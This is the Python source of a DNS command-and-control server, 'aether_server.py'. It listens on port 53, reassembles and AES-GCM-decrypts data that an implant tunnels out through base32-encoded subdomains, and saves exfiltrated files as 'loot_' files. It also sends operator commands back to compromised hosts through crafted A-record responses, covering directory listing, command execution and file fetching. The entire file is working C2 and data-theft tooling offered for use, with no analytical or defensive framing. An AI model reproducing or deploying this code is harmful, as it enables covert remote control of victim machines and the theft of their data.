#!/usr/bin/env python3
"""
aether_server.py - Production-Grade Authoritative DNS C2 Controller.
Implements AES-256-GCM AEAD decryption, packet serialization wrappers,
and dynamic systemd service orchestration.
"""

import os
import sys
import socket
import base64
import zlib
import subprocess
from Cryptodome.Cipher import AES

BIND_IP, PORT, ZONE_DOMAIN = "0.0.0.0", 53, "aether.internal"
SHARED_CRYPTO_KEY = b"AetherFrameworkSecureKey2026!!!!" 

class SessionState:
    def __init__(self):
        self.chunks = {}
        self.expected_chunks = 0
        self.active_file = ""

session = SessionState()

def toggle_resolved_service(action):
    """Safely handles local systemd port conflicts on port 53."""
    try:
        subprocess.run(["systemctl", action, "systemd-resolved"], 
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        status = "STOPPED (Port 53 Cleared)" if action == "stop" else "STARTED (Normal Posture Restored)"
        print(f"[*] Local systemd-resolved service has been {status}.")
    except Exception:
        pass

def decrypt_payload(b32_ciphertext):
    """Decrypts incoming base32 subdomains using AES-256-GCM."""
    try:
        missing_padding = len(b32_ciphertext) % 8
        if missing_padding:
            b32_ciphertext += "=" * (8 - missing_padding)
            
        raw_encrypted = base64.b32decode(b32_ciphertext.upper().encode())
        
        # GCM Structure layout: [IV:12 bytes] + [TAG:16 bytes] + [Ciphertext]
        iv = raw_encrypted[:12]
        tag = raw_encrypted[12:28]
        ciphertext = raw_encrypted[28:]
        
        cipher = AES.new(SHARED_CRYPTO_KEY, AES.MODE_GCM, nonce=iv)
        decrypted_compressed = cipher.decrypt_and_verify(ciphertext, tag)
        return zlib.decompress(decrypted_compressed)
    except Exception as crypto_error:
        print(f"\n[-] Cryptographic validation verification failed: {crypto_error}")
        return None

def build_dns_response(query_data, command_str):
    """Crafts RFC-1035 type A answers wrapping pseudo-IP bytes. TTL=60 (short, normal-looking)."""
    packet = query_data[:2] + b"\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00"
    idx = query_data.find(b"\x00", 12) + 5
    packet += query_data[12:idx] + b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04"  # TTL 60
    packet += command_str.encode().ljust(4, b"\x00")[:4]
    return packet

def process_incoming_query(data, addr, sock, pending_cmd):
    global session
    try:
        idx = 12
        raw_labels = []
        while True:
            length = data[idx]
            if length == 0: break
            raw_labels.append(data[idx+1:idx+1+length].decode(errors='ignore'))
            idx += 1 + length
        
        full_query = ".".join(raw_labels).lower()
        if ZONE_DOMAIN not in full_query: return pending_cmd
        
        # Isolated first list element to ensure perfect type string parsing
        parts = full_query.split("." + ZONE_DOMAIN)
        prefix = parts[0] if parts else ""
        
        if prefix.startswith("str-"):
            _, max_seq, filename = prefix.split("-", 2)
            session.expected_chunks = int(max_seq)
            session.active_file = filename
            session.chunks = {}
            print(f"\n[*] Dynamic stream initialized: '{filename}' (Expecting {max_seq} frames)")
            sock.sendto(build_dns_response(data, "ACK"), addr)
            
        elif prefix.startswith("chk-"):
            _, seq_str, payload = prefix.split("-", 2)
            session.chunks[int(seq_str)] = payload
            sys.stdout.write("."); sys.stdout.flush()
            sock.sendto(build_dns_response(data, "ACK"), addr)
            
        elif prefix.startswith("end-"):
            missing = [str(i) for i in range(session.expected_chunks) if i not in session.chunks]
            if missing:
                next_missing = missing[0]
                print(f"\n[!] Gaps discovered in session matrix tracking. Requesting chunk index: {next_missing}")
                sock.sendto(build_dns_response(data, f"R{next_missing.ljust(3)}"), addr)
                return pending_cmd
                
            print("\n[+] Integrity checks passed. Assembling and decrypting data array...")
            full_ciphertext = "".join(session.chunks[i] for i in range(session.expected_chunks))
            decrypted_data = decrypt_payload(full_ciphertext)
            
            if decrypted_data:
                if session.active_file in ["ls_output.txt", "command_log.txt"]:
                    print(f"\n[Agent Console Output]:\n\n{decrypted_data.decode('utf-8', errors='ignore')}\n")
                else:
                    out_path = f"loot_{session.active_file}"
                    with open(out_path, "wb") as f: f.write(decrypted_data)
                    print(f"\n[+] File successfully saved locally as: '{out_path}'")
                    
            pending_cmd = "0000"
            sock.sendto(build_dns_response(data, "DONE"), addr)
            
        else:
            if pending_cmd == "0000":
                print("\n=== AETHER COMMAND CONSOLE ===")
                print("1: List Directory | 2: Run Command | 3: Fetch File | 5: Terminate")
                opt = input("> ").strip()
                if opt == "5":
                    toggle_resolved_service("start")
                    sys.exit(0)
                arg = input("Parameter: ").strip() if opt in ["1", "2", "3"] else ""
                pending_cmd = f"{opt}{arg[:3]}".ljust(4)
                
            sock.sendto(build_dns_response(data, pending_cmd), addr)
            
    except Exception as frame_error:
        print(f"\n[-] Error handling structural query frame: {frame_error}")
        
    return pending_cmd

def main():
    print("[*] Initializing environment architecture constraints...")
    toggle_resolved_service("stop")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((BIND_IP, PORT))
    except OSError as bind_err:
        sys.exit(f"[-] Binding crash: Port 53 is already occupied. {bind_err}")
        
    print(f"[+] Authoritative Server Online. Listening on interface socket {BIND_IP}:{PORT}...")
    pending_cmd = "0000"
    
    while True:
        try:
            data, addr = sock.recvfrom(2048)
            pending_cmd = process_incoming_query(data, addr, sock, pending_cmd)
        except KeyboardInterrupt:
            toggle_resolved_service("start")
            break
    sock.close()

if __name__ == "__main__":
    if os.geteuid() != 0: sys.exit("[-] Script requires administrative permissions (sudo).")
    main()

